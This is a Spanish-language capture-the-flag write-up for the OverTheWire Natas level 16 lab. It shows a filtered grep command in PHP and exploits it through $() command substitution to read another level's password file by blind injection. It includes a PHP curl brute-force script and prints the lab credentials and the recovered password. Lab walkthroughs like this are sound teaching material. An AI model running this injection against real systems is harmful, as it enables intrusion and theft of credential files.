Si inspeccionamos el HTML, vemos que es similar al del nivel 10. Al obtener el
código, notamos que ahora hay aún mas restricciones con respecto a la entrada
del usuario:

```php
if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

Entre los simbolos permitidos, podemos encontrar `$()`. Esto nos permitira
ejecutar comandos arbitrarios dentro del `grep`. Lamentablemente, no obtendremos
el resultado de estos comandos, por lo que debemos obtener información de forma
indirecta.

```bash
$ grep -i $(grep a.* /etc/natas_webpass/natas17) dictionary.txt
```

El resultado de la expresión interna devolverá la contraseña solo si comienza
con "a". Luego la expresión completa no devolverá nada, ya que la contraseña no
pertenece al diccionario.

Podemos repetir esto de forma incremental para obtener información sobre la
contraseña.

Reutilizaremos el script del nivel anterior, pero cambiando los mensajes
enviados, y el método de envío y validación. La lógica del script en sí será la
misma.

```php
$authorization = "natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V";
$url = "http://natas16.natas.labs.overthewire.org/";
$verify = "<pre>\n</pre>";

function verify($inyection)
{
    global $authorization;
    global $url;
    global $verify;

    $params = array('needle' => $inyection, 'submit' => "Search");
    $handle = curl_init("$url?" . http_build_query($params));

    curl_setopt_array(
        $handle,
        array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_HTTPAUTH => CURLAUTH_BASIC,
            CURLOPT_USERPWD => $authorization,
        )
    );

    $result = curl_exec($handle);

    curl_close($handle);

    return str_contains($result, $verify);
}

function contains_inyection($substring)
{
    return "$(grep $substring /etc/natas_webpass/natas17)";
}

function startwith_inyection($start)
{
    return "$(grep ^$start /etc/natas_webpass/natas17)";
}

function equals_inyection($password)
{
    return "$(grep ^$password$ /etc/natas_webpass/natas17)";
}

...
...
```

Al ejecutarlo, obtendremos la contraseña.

```
$ php crack-natas16.php
...
...
Final password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
```
